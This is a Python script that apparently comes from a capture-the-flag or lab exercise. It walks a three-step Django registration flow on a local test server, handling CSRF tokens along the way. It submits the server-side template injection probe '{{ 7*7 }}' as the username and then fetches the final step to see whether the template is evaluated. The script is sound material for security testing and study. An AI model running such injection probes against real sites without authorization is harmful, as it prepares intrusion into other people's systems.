import requests
import re

url = "http://127.0.0.1:32896"
s = requests.Session()

# Get step 1
r1 = s.get(f"{url}/accounts/register/step1/")
print(f"Step 1 GET: {r1.status_code}")

# Extract CSRF
csrf = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']', r1.text)
if not csrf:
    csrf = re.search(r'csrfmiddlewaretoken["\']?\s*:\s*["\']([^"\']+)["\']', r1.text)

token = csrf.group(1) if csrf else ""
print(f"CSRF token: {token[:20]}...")

# Post step 1 with SSTI payload
r1_post = s.post(f"{url}/accounts/register/step1/", data={
    'csrfmiddlewaretoken': token,
    'username': '{{ 7*7 }}',
    'email': 'test@test.com',
    'password1': 'TestPass123',
    'password2': 'TestPass123'
})
print(f"Step 1 POST: {r1_post.status_code}")

# Get step 2
r2 = s.get(f"{url}/accounts/register/step2/")
print(f"Step 2 GET: {r2.status_code}")

# Extract CSRF
csrf = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']', r2.text)
if not csrf:
    csrf = re.search(r'csrfmiddlewaretoken["\']?\s*:\s*["\']([^"\']+)["\']', r2.text)
token = csrf.group(1) if csrf else ""

# Post step 2
r2_post = s.post(f"{url}/accounts/register/step2/", data={
    'csrfmiddlewaretoken': token,
    'bio': 'test bio',
    'favorite_artist': 'test artist'
})
print(f"Step 2 POST: {r2_post.status_code}")

# Get step 3 and check for SSTI
r3 = s.get(f"{url}/accounts/register/step3/")
print(f"Step 3 GET: {r3.status_code}")
print(f"\n{'='*60}")
print("Step 3 Response:")
